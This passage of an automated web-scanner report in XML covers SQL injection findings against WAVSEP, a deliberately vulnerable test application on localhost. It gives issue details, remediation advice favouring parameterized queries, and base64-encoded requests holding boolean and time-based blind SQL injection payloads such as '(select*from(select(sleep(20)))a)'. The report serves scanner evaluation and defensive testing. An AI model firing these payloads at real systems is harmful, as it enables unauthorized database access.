<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>14228671 or 1292=01292</b> and <b>32132278 or 8014=8017</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20010</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE2LUluamVjdGlvbkluVmlldy1OdW1lcmljV2l0aG91dFF1b3Rlcy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uSWQ9MTMyMTQyMjg2NzElMjBvciUyMDEyOTIlM2QwMTI5MiBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MzQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzIKPC9URD4KPFREPgoxMDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE2LUluamVjdGlvbkluVmlldy1OdW1lcmljV2l0aG91dFF1b3Rlcy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uSWQ9MTMyMzIxMzIyNzglMjBvciUyMDgwMTQlM2Q4MDE3IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE2LUluamVjdGlvbkluVmlldy1OdW1lcmljV2l0aG91dFF1b3Rlcy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uSWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6309408940714196992</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>93788604 or 9963=09963</b> and <b>72292690 or 8295=8300</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWNXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcD9tc2dJZD0xOTM3ODg2MDQlMjBvciUyMDk5NjMlM2QwOTk2MyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzgNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMQo8L1REPgo8VEQ+CldlbGNvbWUgdG8gdGhlIHdlYiBzaXRlCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIKPC9URD4KPFREPgpSZW1lbWJlciB0byBjaGFuZ2UgeW91ciBwYXNzd29yZAo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgozCjwvVEQ+CjxURD4KWW91ciBhY2NvdW50IGlzIGFib3V0IHRvIGV4cGlyZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWNXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcD9tc2dJZD0xNzIyOTI2OTAlMjBvciUyMDgyOTUlM2Q4MzAwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWNXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcD9tc2dJZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3129755108095521792</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
